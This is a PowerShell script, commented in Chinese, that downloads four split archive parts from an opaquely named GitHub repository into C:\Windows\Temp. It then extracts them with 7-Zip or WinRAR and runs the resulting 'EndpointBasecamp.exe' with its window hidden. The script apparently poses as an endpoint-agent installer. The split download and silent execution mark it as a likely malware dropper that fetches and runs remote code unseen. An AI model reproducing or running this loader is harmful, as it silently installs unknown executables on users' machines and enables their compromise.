$ErrorActionPreference = "Stop"

# 檢查 7z 和 WinRAR 的可能路徑
$sevenZipPaths = @(
    "C:\Program Files\7-Zip\7z.exe",
    "C:\Program Files (x86)\7-Zip\7z.exe"
)
$winrarPaths = @(
    "C:\Program Files\WinRAR\WinRAR.exe",
    "C:\Program Files (x86)\WinRAR\WinRAR.exe"
)

# 找到可用的解壓縮程式
$extractor = $null
$arguments = $null

foreach ($path in $sevenZipPaths) {
    if (Test-Path $path) {
        $extractor = $path
        $arguments = 'x "EndpointBasecamp.zip.001" -o"C:\Windows\Temp"'
        break
    }
}

if (-not $extractor) {
    foreach ($path in $winrarPaths) {
        if (Test-Path $path) {
            $extractor = $path
            $arguments = 'x "EndpointBasecamp.zip.001" "C:\Windows\Temp"'
            break
        }
    }
}

# 如果找不到解壓縮程式，退出腳本
if (-not $extractor) {
    Write-Output "Neither 7-Zip nor WinRAR was found. Exiting."
    exit 1
}

# 下載檔案
Set-Location C:\Windows\Temp
Invoke-WebRequest -Uri "https://github.com/uvUpAjx4Zp/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.001" -OutFile "EndpointBasecamp.zip.001"
Invoke-WebRequest -Uri "https://github.com/uvUpAjx4Zp/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.002" -OutFile "EndpointBasecamp.zip.002"
Invoke-WebRequest -Uri "https://github.com/uvUpAjx4Zp/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.003" -OutFile "EndpointBasecamp.zip.003"
Invoke-WebRequest -Uri "https://github.com/uvUpAjx4Zp/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.004" -OutFile "EndpointBasecamp.zip.004"

# 解壓縮
try {
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = $extractor
    $startInfo.Arguments = $arguments
    $startInfo.CreateNoWindow = $true
    $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $process = [System.Diagnostics.Process]::Start($startInfo)
    $process.WaitForExit()

    # 驗證解壓縮是否成功
    if (-not (Test-Path "C:\Windows\Temp\EndpointBasecamp.exe")) {
        Write-Output "Extraction failed. The target file was not found."
        exit 1
    }
} catch {
    Write-Output "An error occurred during extraction: $_"
    exit 1
}

# 執行解壓後的檔案
try {
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = "C:\Windows\Temp\EndpointBasecamp.exe"
    $startInfo.CreateNoWindow = $true
    $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    [System.Diagnostics.Process]::Start($startInfo)
} catch {
    Write-Output "An error occurred while executing the extracted file: $_"
    exit 1
}
